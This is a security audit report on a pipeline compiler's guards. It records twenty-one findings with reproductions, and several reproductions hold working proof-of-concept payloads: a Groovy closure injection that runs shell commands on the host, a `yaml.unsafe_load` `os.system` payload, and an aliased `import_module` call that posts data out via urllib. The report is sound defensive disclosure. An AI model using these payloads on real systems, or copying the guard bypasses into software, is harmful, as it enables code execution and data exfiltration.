# Round four — the audit

**Scope:** `main` at `1da68dc` (Plan 1.11, closing round three). The first audit of Plan 1.11's
surface, plus a fresh sweep of the four test-enforced invariants. Run by the method in
[`2026-08-07-round-two-brief.md`](2026-08-07-round-two-brief.md) — *revert and watch, not read* —
with four cold reviewers holding no session context. Two reviewers completed; two ended early on
session limits (recorded below — their scope is owed a round five).

Findings keep their numbers permanently. Round four starts at **A55**.

**Every finding marked CONFIRMED was reproduced first-hand in this worktree**, per the brief's
rule, after a reviewer raised it — the reproductions below are mine. Findings marked
PLAUSIBLE were raised by a reviewer and are **not yet re-verified first-hand**; they are
hypotheses until reproduced, and a fix plan must reproduce them first.

**A14 does not close this round.** Four critical findings survived a fresh audit — three in the
guards A14 itself is about, one in code Plan 1.11 shipped. The loop's exit criterion, no critical
finding surviving, is not met.

| # | Finding | Severity | Verdict |
|---|---|---|---|
| A55 | `settings[].value` on a non-templated `ext` route emits a Groovy closure — arbitrary code on the pipeline host | **critical** | CONFIRMED |
| A56 | A54's fix made `source: HUMAN` self-certifying: a resolver clears its own tier-4 flag and forges the `human_override` MD0220 checks | important | CONFIRMED |
| A57 | the egress guard filters on `model_fields`; `@computed_field` and `@model_serializer` put keys in the JSON that cross a door unchecked | **critical** | CONFIRMED |
| A58 | `yaml.unsafe_load` is an RCE primitive on the purity allowlist — the static scan models stdlib capability, not third-party capability | **critical** | CONFIRMED |
| A59 | the runtime hook is armed over resolve+emit only; the loading stack that parses stranger YAML runs unwatched | **critical** | CONFIRMED |
| A60 | the dynamic-importer check matches a spelling; `from importlib import import_module as _load` walks past it (A18 recurrence) | important | CONFIRMED |
| A61 | `BANNED_PREFIXES` misses stdlib transports — `logging.handlers.HTTPHandler`, `poplib`, `multiprocessing.connection`, … | important | PLAUSIBLE |
| A62 | the construction guard resolves only `import … as`; an assignment alias, a subclass, or `model_copy` builds a `Pipeline`/`DataProfile` invisibly | important | CONFIRMED |
| A63 | the leaf allowlist admits `enum.Enum` unconditionally; an enum with `_missing_` is an open vocabulary | important | PLAUSIBLE |
| A64 | nine of seventeen `Mark`s are bare `Annotated[str]` with no validator; a newline or a path crosses a door payload today | minor | CONFIRMED |
| A65 | `test_every_ambiguity_field_can_cross_the_door` iterates a hand-maintained tuple; a fourth kind is invisible until someone edits it | minor | PLAUSIBLE |
| A66 | `frozen=True` is one level deep; the publication payload's own `Emitted` evidence is mutable after review | minor | CONFIRMED |
| A67 | both AST guards hardcode package directory names and assert nothing about having read a file — a rename gives an empty loop and green | minor | PLAUSIBLE |
| A68 | `test_pipeline_totality`'s main guard checks field *names* in a flat set; 60% of the fields it claims to check are compared against themselves | important | CONFIRMED |
| A69 | A14's exit criterion is measured per test *file* (46/47) when its condition is per *guard* (~34 of ~183 named) | important | CONFIRMED |
| A70 | `mendel publish` certifies a directory whose `main.nf` does not match `pipeline.yml` when the `emitted:` block is absent — the door-with-no-undo integrity check goes silent | important | CONFIRMED |
| A71 | CLAUDE.md says the guard ledger has "40-odd rows"; it has 126 | minor | CONFIRMED |
| A72 | CLAUDE.md and the ledger's residue paragraph say "eleven files still have none"; two have since gained rows, so it is nine (the doc half of A69) | minor | CONFIRMED |
| A73 | GitHub issue #18's body says "41 raise sites, 32 bare `ValueError`"; the real count is 91/56 (CLAUDE.md is right, the tracker is stale) — the fix plan scoped from it inherits a 55%-too-small estimate | important | CONFIRMED |
| A74 | `mendel emit`/`upgrade` report a `pipeline.yml` defect as "this goal is not valid" and point at pydantic.dev, not `mendel explain` — the A41 fix special-cased `ModuleContract` and left the `Pipeline` family | important | CONFIRMED |
| A75 | 23 coded refusals raise a `ValueError` carrying an `MD` code, but the CLI prints the raw message and a pydantic.dev URL — nothing routes the reader to `mendel explain`, which exists | minor | CONFIRMED |

**A55–A56 attack Plan 1.11 directly. A57–A67 are the four guards, freshly defeated by shapes they
were not written against — the same result round one and round two produced, one abstraction layer
up each time.** A58 and A59 **compose**: a `yaml.unsafe_load` in `layers.load` reaches the network
during the one stage neither guard watches, defeating the union.

---

## A55 — a resolved value executes as Groovy on the pipeline host. **Critical. CONFIRMED.**

`emit._ext_scope` has two branches. The templated branch (`emit.py:277`) calls `substitutable()`
and refuses `${…}` with MD0201. The **non-templated branch** (`emit.py:265`) appends
`str(setting.value)` raw, with no validation. At the join (`emit.py:296`) a fragment containing
`${` is emitted as a Groovy **closure** — `ext.<key> = { "…" }` — whose body is a GString evaluated
per task. `pipeline-schema.md` promises the opposite: "Values are validated, not escaped … `_ . : +
-` only (MD0201)".

This is not a tampered route. `prefix` is a **non-templated key by design** — MD0204 *refuses* a
template on it — so `key: prefix, template: null` is its only legal shape and every value on it
takes the unvalidated branch. `settings[].value` is the field `pipeline.yml`'s own header tells a
human to edit, and `pipeline.yml` is a shareable, publishable artifact. The victim runs `mendel
emit` or `mendel publish --gate test` on a pipeline someone handed them.

### Reproduction (mine, end to end)

A built spine; only the tier-4 setting's `value` changed, `key: prefix`, `template: null`:

```yaml
  - name: seq_platform
    value: ${['sh','-c','id > /tmp/.../RAFAEL_PROOF'].execute().text}
    via: ext
    key: prefix
    template: null
```
```
$ uv run mendel emit build/pipeline.yml --out build/     # exit 0, no diagnostic
$ grep ext.prefix build/nextflow.config
    withName: STAR_ALIGN { ext.prefix = { "${['sh','-c','id > /tmp/.../RAFAEL_PROOF'].execute().text}" } }
$ nextflow run main.nf                    # process does `def prefix = task.ext.prefix ?: ''`
[e4/aaa54f] STAR_ALIGN (1) | 1 of 1 ✔
args were: --readFilesCommand zcat        # ← injection invisible in the log
$ cat /tmp/.../RAFAEL_PROOF
uid=1000(rafael) gid=1000(rafael) groups=…,957(docker),…
```

Code ran on the host, outside any container, as a user in the `docker` group; the task log shows
nothing.

### Fix direction

Validate `Setting.value` for every `via: ext` setting, not only the templated branch — ideally at
`Setting`/`Pipeline` load, so a shared `pipeline.yml` is refused before `emit`. The closure branch
in `_ext_scope` must be reachable only for `${…}` that came from a `_nf_template`-validated
template, never from a raw value. `via: meta` and `via: directive` are safe: both single-quote
through `_render_literal` (see Clean).

---

## A56 — A54's fix made a dishonest resolver self-certifying. **Important. CONFIRMED.**

`decision.py` already concedes a resolver could set `source` untruthfully — "the same standing as
`confidence` and `reason`." That is not the finding. The finding is that `source: HUMAN` is **not**
like those two: it clears the tier-4 review (`needs_review()` drops the item into `overrides()`),
and A54's fix (`resolve.py:308`) now *writes* `human_override = resolution.chosen` whenever the
resolver claims HUMAN — the very evidence MD0220 demands. So MD0220 constrains only hand-edited
files; against a resolver it is satisfied automatically by a value the resolver invented. Invariant
6 — "tier 4 is always flagged, even at high model confidence … the difference from a chat window"
— is defeated. The comment at `resolve.py:305` asserts "Only `ReplayResolver` returns `HUMAN`"; A54
turned that unenforced assumption into a load-bearing one.

Latent today (`FlagOnlyResolver` never sets HUMAN); **live the moment Plan 2 wires a model to that
port** — which is exactly the code Plan 2 builds on, and the reason Plan 1.8 was ordered before
Plan 2.

### Reproduction (mine)

A resolver returning `source=HUMAN` for its own guess, through `resolve()`:
```
needs_review(): []
overrides():    ["star_align.seq_platform = 'nefarious'"]
decision: star_align.seq_platform  tier=4  chosen='nefarious'
          human_override='nefarious'  resolved_by='totally-a-model'
```
The red flag is gone and a `human_override` no human wrote sits in the record; the resulting
`pipeline.yml` passes MD0218 and MD0220.

### Fix direction

Do not accept `HUMAN` from a live resolver's `Resolution`. `HUMAN` should be reachable only through
the replay path — `_resolve_param` never sets `source=HUMAN` or synthesises `human_override` from a
resolver's return; only `ReplayResolver` replaying a recorded override produces it. Then MD0220
checks something the resolver cannot forge.

---

## A57 — the egress guard reasons about annotations; serialisation has two other doors. **Critical. CONFIRMED.**

Every rule in `test_egress.py` filters on `if name in payload.model_fields`. Pydantic has two other
ways to put a key in the JSON that crosses a door, and neither touches `model_fields`: a
`@computed_field` (lands in `model_computed_fields`) and a `@model_serializer` (replaces the dump
wholesale). The allowlist that was inverted from a blocklist precisely so "an unnamed shape is
silence" could not recur is still a blocklist with respect to *where a value comes from*.

### Reproduction (mine)

`@computed_field` on `PromptRequest`:
```python
    @computed_field
    @property
    def context(self) -> str:
        return "/data/patients/PT-4471023/notes: BRCA1 c.68_69del, dx 2019"
```
```
$ uv run pytest tests/test_egress.py -q   →  15 passed
$ PromptRequest(prompt='count genes').model_dump_json()
{"prompt":"count genes","context":"/data/patients/PT-4471023/notes: BRCA1 c.68_69del, dx 2019"}
```
`@model_serializer` returning `{"prompt":…, "site":"/mnt/phi/…", "notes":"BRCA1 c.68_69del"}` — same
result, `15 passed`. A bare `str` field in the same position **is** caught (see Clean), which is
what makes this the shape problem, not a rule problem.

### Fix direction

Ask what is *serialised*, not what is *annotated*. Iterate `model_computed_fields` alongside
`model_fields` and run the leaf check on each computed field's return type; and assert no payload
defines a `@model_serializer` — e.g. `set(model.model_dump().keys()) <= set(model.model_fields)` for
a default-constructed instance of each payload in `_payload_types()`.

---

## A58 — `yaml.unsafe_load` is an RCE primitive on the allowlist. **Critical. CONFIRMED.**

`CLOSED_PACKAGES` is an allowlist over *module names*. `yaml` is on it, and PyYAML's non-safe
loaders are arbitrary-code-execution: `!!python/object/apply:` instantiates any importable callable.
`yaml.unsafe_load` is a single-link attribute on an allowlisted module, so the `ast.Attribute` rule
does not fire — it triggers only when `node.attr in sys.stdlib_module_names`, and `unsafe_load` is
not a module name. No banned prefix, no `__import__`, no `exec`. This is a whole axis the scan does
not consider, not the documented two-link/`getattr` gap.

### Reproduction (mine)

A pure-package file importing only `yaml`:
```python
import yaml
def go():
    return yaml.unsafe_load('!!python/object/apply:os.system\nargs: ["echo RCE > /tmp/.../YAML_RCE"]\n')
```
```
$ uv run pytest tests/test_purity.py -q         →  1 passed
$ python -c "from comeni_core.rafael_probe import go; go()"
$ cat /tmp/.../YAML_RCE
RCE_via_yaml
```
A1 reproduced through a route A1's fix does not cover.

### Fix direction

The allowlist must be over *capabilities* for third-party entries. Ban the attribute names
`unsafe_load`, `full_load`, bare `load`, `Loader`, `UnsafeLoader`, `FullLoader` on any name bound to
`yaml`, in the same `ast.Attribute` pass. `comeni_core/yaml_strict.py` is already the one place that
may name a loader — a one-file exemption. General lesson: a closed allowlist with "no unknown
unknowns" holds only if each allowlisted module's *surface* is also closed.

---

## A59 — the runtime hook does not watch the stage that reads stranger files. **Critical. CONFIRMED.**

`test_a_real_build_opens_no_socket_and_spawns_no_process` calls `layers.load(...)` and
`Goal.model_validate(...)` at lines 112–113, **before** `state["armed"] = True` at line 115.
Everything that parses declared data — `comeni_core/layered.py`, `yaml_strict.py`,
`mendel_resolver/layers.py` — runs unwatched. That is precisely the stage that ingests
stranger-authored registry YAML.

### Reproduction (mine)

A real, watched socket opened inside `layers.load`, immediately before its `return`:
```python
    __import__('socket').socket().close()   # PROBE
    return Layers(...)
```
```
$ uv run pytest tests/test_purity_runtime.py -q   →  2 passed
```
The same call inside `resolve()` is caught (see Clean). Same event, one stage over, invisible.
**Composed with A58**, a `yaml.unsafe_load` in `layers.load` reaches the network during the
unwatched stage: the union of the two guards is defeated.

### Fix direction

Arm the hook around the whole build — move `addaudithook` and `armed=True` above `layers.load` — and
add a case that drives `mendel_compiler.cli` end to end under the hook with a gate that runs no
tool. Then assert coverage: record the set of pure files that executed under the hook and fail if it
shrinks, so the region cannot quietly narrow again.

---

## A60 — the dynamic-importer check matches a spelling. **Important. CONFIRMED.**

`DYNAMIC_IMPORTERS = ("__import__", "import_module")` is compared against `node.func.id`/`.attr`.
`mendel-compiler` is banlist-only and `importlib` is not banned, so the importer can be bound under
any name. This is A18's defect — and `test_purity.py` already contains the alias resolver that fixes
it (`_imported_names`, which `test_construction.py` imports from this very file).

### Reproduction (mine)

In `mendel_compiler/gates.py`:
```python
from importlib import import_module as _load
def _tele(p):
    _load('urllib.request').urlopen('http://127.0.0.1:9/c', data=p.encode())
```
```
$ uv run pytest tests/test_purity.py -q   →  1 passed
```

### Fix direction

Resolve aliases before matching, the `_aliases_of` shape `test_construction.py` uses; add
`importlib` to `BANNED_PREFIXES` except `importlib.metadata` (already carved out by
`DOTTED_ALLOWED`).

---

## A61 — `BANNED_PREFIXES` misses several stdlib transports. **Important. PLAUSIBLE.**

Reviewer-reported, not re-verified this session. The banlist claims to cover "stdlib transports" but
omits `logging` (`logging.handlers.HTTPHandler` is a complete HTTP POST client, plus
`SocketHandler`/`DatagramHandler`/`SMTPHandler`), `poplib`, `imaplib`, `socketserver` (exact
membership, so `socket` does not cover it), `multiprocessing` (`multiprocessing.connection.Client`),
`wsgiref`. Reviewer's probe: `import logging.handlers` + `HTTPHandler(...)` in `gates.py` → `1
passed`.

### Fix direction

Add the names; more durably, close `mendel-compiler` with an allowlist that admits `subprocess` and
`re` explicitly, converting an open enumeration into a two-line exemption.

---

## A62 — the construction guard resolves only `import … as`. **Important. CONFIRMED.**

`_aliases_of` collects names from `ast.ImportFrom` only. An assignment alias, a subclass, or
`model_copy` each denote the class without an import-as.

### Reproduction (mine)

In `mendel_compiler/pipeline_file.py`:
```python
_P = Pipeline
def _handmade():
    return _P.model_construct(version=1)
```
```
$ uv run pytest tests/test_construction.py -q   →  2 passed
```
Spelling `Pipeline` directly is caught (see Clean). Reviewer also showed `_DP = DataProfile` and a
`DataProfile` subclass bypassing the profile guard — lower stakes there, because `resolve()`
re-validates every measurement (A2). Related: `model_copy(update=…)` builds an instance without
validation and is not in `BYPASSES`, though on a payload it does not reach `model_dump()`.

### Fix direction

Extend `_aliases_of` to collect assignment targets aliasing a known name and `ClassDef`s whose bases
include an alias. Add `model_copy` to `BYPASSES` for the `Pipeline` scan and grant
`pipeline_file.py` that spelling explicitly, as `model_validate` already is.

---

## A63 — the leaf allowlist admits `enum.Enum` unconditionally. **Important. PLAUSIBLE.**

Reviewer-reported, not re-verified this session. `_leaf_problems` returns `[]` for any `Enum`, on
the premise that an enum is closed vocabulary. `Enum._missing_` is the documented hook for accepting
undeclared values and can synthesise a member from anything. Reviewer added a `_missing_` enum field
to `GateFailure` (door 3) and crossed an arbitrary path string with `15 passed`.

### Fix direction

Admit an `Enum` only if `"_missing_" not in vars(cls)` for the class and every base below `Enum`.

---

## A64 — nine of seventeen `Mark`s carry no validator. **Minor. CONFIRMED.**

`NodeId`, `Subject`, `PortName`, `StateName`, `DecisionKey`, `MeasurementId`, `Digest`, `LayerName`,
`ModuleKey` are bare `Annotated[str, Mark.X]` with no `AfterValidator`, so "a declared ID alias"
means "a `str` with a label". On the **unmodified tree**, no probe:
```
AmbiguityRequest(node_id='patient PT-4471, /data/S1_R1.fastq.gz',
                 subject='BRCA1 c.68_69del',
                 states=['dx: carcinoma\nnotes: see /mnt/phi/4471.pdf'])  # crosses door 2
EmittedFile(name='main.nf', digest='not-a-digest: PT-4471023')           # crosses door 4
```
Both serialise verbatim. Note the `StateName` carrying a newline — `_single_line` is applied to
`Line`/`ResolverId`, not to `StateName`. Generalises A3, recorded for `PARAM_LITERAL` only.

### Fix direction

Cheap subset first: `Digest` → `sha256:` + 64 hex; `NodeId`/`PortName`/`StateName`/`MeasurementId`/
`ModuleKey` → identifier- or type-id-shaped validators (all registry-derived, zero cost);
`Subject`/`DecisionKey` → `_single_line` at minimum. Whatever stays a bare label should be listed in
the guard the way `FREE_TEXT_FIELDS` is, so the count is honest.

---

## A65 — `AmbiguityKinds` is a hand-maintained tuple. **Minor. PLAUSIBLE.**

Reviewer-reported. The door-totality test loops over a literal tuple in `decision.py`; its docstring
claims "a fourth kind added without a slot would fail" — true only if the author also edits the
tuple. Reviewer added a fourth `Ambiguity` subclass **not** in the tuple → `15 passed`; adding it to
the tuple fails as designed. The check is live, its input is incomplete.

### Fix direction

`AmbiguityKinds = tuple(Ambiguity.__subclasses__())`, or assert the tuple equals the subclass set.

---

## A66 — `frozen=True` is one level deep. **Minor. CONFIRMED.**

`EgressPayload` is frozen; every nested model (`Emitted`, `EmittedFile`, `Goal`, …) is a plain
`BaseModel`. On the **unmodified tree**:
```
e = Emitted(files=[EmittedFile(name='main.nf', digest='sha256:'+'a'*64)], ...)
e.files[0].digest = 'sha256:forged'   →  'sha256:forged'   # mutated after review
```
`Emitted` is the self-verification evidence — the one field where post-review mutability is least
wanted. `test_the_publication_payload_is_frozen` asserts only the top level and generalises in its
docstring to "what was reviewed is what is sent".

### Fix direction

Assert `model_config.get("frozen") is True` for every model in `_payload_types()`, beside the
existing `extra=="forbid"` walk. Mutable lists (`Goal.want`) need `tuple`/`frozenset` or a
written-down exception.

---

## A67 — the AST guards hardcode package directories. **Minor. PLAUSIBLE.**

Reviewer-reported. `test_purity.py` and `test_construction.py` glob `packages/<name>/src`; a missing
directory yields nothing and the assertion runs over an empty list. `test_purity_runtime.py` has the
guard-of-the-guard the other two lack. Reviewer mistyped both package keys → `1 passed` in 0.04s (vs
0.13s). A package *intended* pure but renamed silently carries no guard.

### Fix direction

Assert each configured directory exists and the scan visited a plausible file count; enumerate
`packages/*` and require every directory to be classified pure, banlist, or explicitly impure.

---

## A68 — the totality guard checks names against themselves. **Important. CONFIRMED. (mine)**

`test_pipeline_totality` is the only mechanical check on a hand-written 3-types-into-1 mapping whose
own docstring says "reviewing it by eye already failed five times." `_homes()` is a flat set of
field *names* reachable from `Pipeline` — no type check, no path check.

- Removing `ModuleRef.digest` (the module content pin) leaves it green: `EmittedFile.digest` supplies
  the name. `4 passed`. (19–22 other tests catch the consequence; the guard does not.)
- 9 of the 16 `REPLACED` types are carried by `Pipeline` verbatim, so deleting one of their fields
  removes it from both sides at once. `Displacement.winning_key` removed → `4 passed`. That is **47
  of 78 fields (60%) checked against themselves**, including `candidates`, `chosen` and `confidence`
  — three of the five fields the test was written to catch.

The other three guards in the file are sound (see Clean).

### Fix direction

Check the field has a home *of the right type on the right path*, not merely a name-match somewhere
in the graph. For the verbatim-carried types the check is vacuous by construction and should be
replaced by an identity assertion (`Pipeline` embeds this exact model), so a dropped field on the
source type is caught at the source.

---

## A69 — A14's exit condition is measured at the wrong granularity. **Important. CONFIRMED. (mine)**

A14 closes when "every guard in `tests/` has a recorded revert." The ledger's residue is tracked per
**file**: by that measure 46 of 47 test files are covered and A14 reads as nearly closed. Its
condition is per **guard** — a guard being a test that refuses something. Counted per test: ~183
refusal-shaped tests exist, ~34 are named individually in the ledger (a rough heuristic; the exact
numbers are not the point, the order-of-magnitude gap is). The file-level framing is what makes A14
look almost done while three of its four guarded invariants fell this round.

Relatedly, `CLAUDE.md`'s "names the eleven files that still have none" is stale — one file
(`test_pipeline_totality.py`) had none, and it has a row now (Clean).

### Fix direction

State A14's condition per guard, not per file, and track the residue that way. The file count is not
evidence that the guards inside a covered file have each been watched.

---

## A70 — `publish` certifies an unchecked `main.nf` when `emitted:` is absent. **Important. CONFIRMED.**

Publish's whole integrity claim is `_refuse_a_divergent_directory` (`cli.py:493`): the gate runs on
the files this `pipeline.yml` describes. It calls `pipeline_file.hand_edited` (MD0214) and
`is_stale` (MD0213), and **both short-circuit to a no-op when `pipeline.emitted is None`**
(`pipeline_file.py:129`, `:146`). So a `pipeline.yml` with no `emitted:` block — a supported,
documented state for archived or hand-authored pipelines — passes the divergence guard
unconditionally, and publish runs the gate on whatever `main.nf` is on disk and stamps the verdict,
with nothing tying that `main.nf` to the artifact a person read. The non-Docker gates only validate
`main.nf` *as Nextflow*; they never compare it to `pipeline.yml`, so the divergence guard is the
only tie, and it is the one that goes silent. This is the residual of A50's guarantee — publish is
the door with no undo.

### Reproduction (mine)

```
$ uv run mendel build --goal examples/rnaseq-goal.yml --out pub --gate preview   # star RNA-seq spine
# strip the emitted: block from pub/pipeline.yml (archived/hand-authored files have none)
# overwrite pub/main.nf with an unrelated valid workflow
$ uv run mendel publish pub/pipeline.yml --gate preview
gate preview: PASS          # exit 0
```
The published `pipeline.yml` then permanently records `emitted.files[main.nf].digest =
sha256:731447a9…` — the digest of the **bogus** `main.nf`, confirmed equal — beside `from_digest`
= the real pipeline's content digest. The artifact asserts that this RNA-seq pipeline emitted that
unrelated file and passed the gate. With the `emitted:` block **present**, the same corrupted
`main.nf` is correctly refused with MD0214; no test covers the `emitted: None` path.

### Fix direction

Treat "no `emitted` record" as *uncertifiable* on the certifying verb rather than "nothing to
check": `_refuse_a_divergent_directory` should refuse when `previous.emitted is None`, directing the
user to `mendel emit` first (which regenerates the files and stamps `emitted`, after which MD0213/
MD0214 are meaningful). Leave `emit` itself unchanged — it is the cure and legitimately regenerates
from an `emitted: None` file. The scope question the reviewer was set — whether the build-time
conformance relocation holds — **holds**: `build`, `upgrade` and `profile` all run
`conformance.check` unconditionally before emitting, and no genuinely-built pipeline reaches publish
with unchecked contracts. A70 is a separate hole, about `main.nf`↔`pipeline.yml` correspondence, not
contract↔module conformance.

---

## A71 / A72 — CLAUDE.md's ledger counts are stale. **Minor. CONFIRMED.**

CLAUDE.md line 63 says the guard ledger has "40-odd rows now" — it has **126** data rows
(`grep -cE '^\| 2026-'`). Line 63–64 says the ledger "names the eleven files that still have none";
two of those eleven (`test_counts.py`, `test_conformance_cli.py`) gained real revert rows in Plan
1.10, so the honest count is **nine** — and this round `test_pipeline_totality.py` (the last file
with none) gained rows too, so the *file-level* residue is now exhausted. Both are present-tense
claims that drift because nothing counts them; A72 is the documentation half of A69.

### Fix direction

Replace the two numbers with range-free phrasing or a generated count. When the A69 fix restates
A14's residue per guard, these sentences are rewritten anyway.

---

## A73 — issue #18's own body understates the error surface by ~50 sites. **Important. CONFIRMED.**

Issue #18's body says "41 raise sites, 32 bare `ValueError`." The real count in the three pure
packages today is **91 raises / 56 bare `ValueError`** — which is exactly what CLAUDE.md's issue
table already says (line 414). So the durable doc is right and the *tracker that scopes the fix* is
stale, understating the surface by ~50 sites (Plan 1.10 added `pipeline_file.py`, `emit.py` and
`pipeline.py` refusals after the issue was filed). A fix plan scoped from the issue inherits a
55%-too-small estimate.

### Reproduction (mine)

```
$ grep -rn "raise "        packages/*/src | wc -l   →  91
$ grep -rn "raise ValueError" packages/*/src | wc -l   →  56
```

### The recount, for whoever fixes #18

The surface is **three-way**, not "half declared / half bare" as the issue frames it:

| bucket | count | action |
|---|---|---|
| typed diagnostic classes (10) — `Unroutable*`, `NoCandidatesError`, `RuleValidationError`, `Unknown{Type,State,Measurement}Error`, `DuplicateKeyError`, … | 27 raises | prime `MD0300`–`MD0399` candidates: code + `explain` + `fix:` |
| `ValueError` **already carrying** an `MD` code (raised from model validators / `emit.py`) | 23 | coded but not routed to `explain` — see A75 |
| **uncoded** user-facing authoring refusals (`layers.py`, `measurement.py`, `vocabulary.py`, `modulespec.py`, `contract.py` port shape, …) | ~17 | the real backlog: assign codes |
| low-level pydantic value validators (`marks.py`) | 13 | mostly keep; a couple encode safety and could cite a code |
| internal invariants that should be `assert` | ~3 | convert |
| deliberate re-wrap (`conformance.py:55`) | 1 | no change |

Every typed class subclasses `ValueError`/`KeyError` and `main()` catches them, so the issue's
"laboratory gets a traceback" premise is **already mostly closed** for CLI paths — what remains is
no code, no `explain`, no `fix:` line, plus the two behavioural bugs A74/A75. Rough cost of the
whole #18 fix: **~3 developer-days**, front-loaded on A74/A75 (correctness, not cosmetics).

---

## A74 — a `pipeline.yml` defect is reported as a bad *goal*. **Important. CONFIRMED.**

`cli.py:42` sets `subject = "contract" if exc.title == "ModuleContract" else "this goal"`. That
heuristic — the A41 fix — special-cased `ModuleContract` only. A `Pipeline`-family validation
failure (title `Pipeline`/`Step`/`Setting`/…) falls through to "this goal". But `emit` and `upgrade`
take a `pipeline.yml`, **not** a goal — the file's own header says "`goal:` is INERT to `mendel
emit`." This is the exact shape the brief named: a real failure reported as a bad goal when the goal
was fine.

### Reproduction (mine)

A built pipeline, one step id duplicated, then `mendel emit`:
```
mendel: this goal is not valid —
1 validation error for Pipeline
  Value error, MD0212: two steps share the id trimgalore. …
    For further information visit https://errors.pydantic.dev/2.13/v/value_error
```
Exit 2 — correctly refused — but the reader edited `steps:`, is told the *goal* is wrong, and is
sent to pydantic.dev rather than to `mendel explain MD0212`, which exists and is rich.

### Fix direction

Key the subject off the command — `emit`/`upgrade` have no goal, so their subject is "this
pipeline.yml" — or recognise the `Pipeline`-family titles. ~10 lines plus a regression test.

---

## A75 — coded refusals do not route the reader to `mendel explain`. **Minor. CONFIRMED.**

23 `ValueError` sites (and the pydantic-wrapped model validators generally) embed a real `MD` code
in their message, but the CLI prints the raw message plus a `pydantic.dev` URL; nothing tells the
user `mendel explain MD0212` exists. The machinery is already built and already good.

### Fix direction

When a caught message matches `MD0\d{3}`, append `— run: mendel explain <code>`. ~5 lines in
`main()`. Fold into the A74 fix.

---

## Clean — attacked and held

Every row below was applied, run, and reverted; the guard fired and named the defect.

**Plan 1.11's new refusals are live, not inert (unlike MD0216 last round):**

| broke | guard fired |
|---|---|
| `test_data` unescaped (A44) | `MD0217`, naming it |
| MD0218 value/override contradiction | `test_value_and_human_override_may_not_contradict` |
| MD0219 duplicate decision key | `test_a_duplicate_decision_key_is_refused` |
| MD0220 human source without override | `test_human_source_requires_a_matching_override` |
| `via: meta` value | single-quoted by `_render_literal`; `${…}` inert inside a Groovy single-quoted string |
| `via: directive` value | same, held |
| A38 `via: meta`/`directive` now emit | arity-agnostic `[ it[0] + [k:v] ] + it[1..-1]` emitted correctly |

**The four guards catch the shapes they were written against:**

| broke | guard fired |
|---|---|
| a fifth entry in `egress.DOORS` | names the extra door |
| a bare `user_note: str` on a payload | two rules fire independently |
| `dict` / `Path` / `tuple` / `bytes` leaf on a payload | each named as an undeclared shape/container |
| `import socket` / `import httpx` / `import ctypes` in a pure file | static scan names the file and import (A17 holds) |
| `pathlib.os.system` (attribute chain) | named as `os` reached as an attribute (A1 holds) |
| `__import__("openai")` | "imports must be statically visible" |
| a watched socket raised inside `resolve()` | runtime hook attributes it to the frame |
| `DataProfile(...)` / `Pipeline.model_construct(...)` spelled directly | construction guard names the site |

**The pipeline-file guards not covered by A68:** stale `NOT_CARRIED` entry → fails; a `frozenset`
field without a serializer → fails naming it; a `ModuleContract` on the payload → fails (and
`test_egress.py` catches it too).

**Determinism (round-three A42 row, re-checked and now fully closed):** dropping the dedup at
`emit.py:333` fails `test_a_contract_used_by_two_steps_emits_its_process_block_once`; dropping only
the *sort* fails `test_output_is_identical_across_hash_seeds`. Both halves are guarded.

**Digest forgery (A21, 2026-08-07 row):** re-verified against current code — `entry_hash` returning
`f"{name}:{content_digest}"` unhashed fails `test_a_filename_cannot_forge_an_entry_boundary` with the
identical message recorded.

**The 542 count:** round three's five "stayed green — 542 passed" conclusions were checked for the
wrong-tree hazard the 1.11 journal names. `542` is the legitimate fast-test collection count at
`b0a4550` (confirmed by collecting there directly); those conclusions stand.

## A36 — still open, still inert, now characterised

Confirmed open. `_FILE = b""` → `591 passed`. Two refinements: the tag's *value* is inert but the
*consistency* between its two use sites is guarded (changing one site fails
`test_the_streaming_and_in_memory_content_hashes_agree`); and no `sha256:` literal is pinned anywhere
in the repo, so the format is free to move today and nothing would catch it moving by accident.

## Lifecycle/registry — covered on a relaunch (A70, above)

The reviewer assigned to `emit`/`upgrade`/`publish`, replay and the four-kind registry stack ended
early on the first pass and was relaunched. It found **A70** (above) and re-verified, by revert or
adversarial hand-edit, that the round-three fixes hold: **A50** (publish ignores a `--registry`
overlay — stays star, no re-resolution), **A51** (a rules displacement reaches
`registry.displaced`; reverting `RuleTable.of`'s `displaced` fails `test_a_rules_displacement_
reaches_the_artifact`), **A53** (`upgrade --out` refuses to overwrite a *different* pipeline),
**A47** (emit preserves the gate verdict), **A46** (a tier-4 answer has one effective home across
emit and upgrade), and **A48** (a `pipeline.yml` with no `goal:` is refused). Load-time MD0212/
0218/0219/0220 all fire on adversarial hand-edits; two independent builds are byte-identical. The
build-time conformance relocation **holds** (see A70's fix note).

## Documentation and the error surface — covered on a relaunch (A71–A75, above)

The docs/#18 reviewer was relaunched after the reset and completed. Beyond A71–A75 it walked, by
executing the claim, and found **held**: `ARCHITECTURE.md` type-by-type (every backticked identifier
resolves at its stated spelling; the two that do not exist — `KNOWN_DEAD_RULES`, `ProfilePolicy` —
are correctly framed as removed/future); `cli.md`'s six commands and its generated diagnostics table
(perturbing a row and running `make docs` fails CI, restored); `pipeline-schema.md`'s `via:` table
(the "validated, not escaped" line is the known A55 defect; no second claim of that shape found);
`getting-started.md` reproduced end to end including the read_length→HISAT2 switch;
`privacy-and-egress.md`'s four-door table and seven-free-text-field count; CLAUDE.md invariant 14's
"seven fields" and the "30 codes" claim. One caveat worth an eye, not filed: `tests/test_egress.py`
carries an internal comment "Exactly two fields may carry it" above a set of seven — the same drift
family as invariant 14.

## Not audited — owed a round five

Both reviewer streams are now in. What round four did **not** touch: the protection profiles
(`open`/`guarded`/`sealed` — no implementation exists to audit), the `slow` Docker lane beyond the
one counts-matrix probe, and any impure sender (none exists yet — Plan 2). Round five's first job is
the fixes: A55–A75 are findings, not repairs, and A14 stays open until a fresh audit finds no
critical surviving.
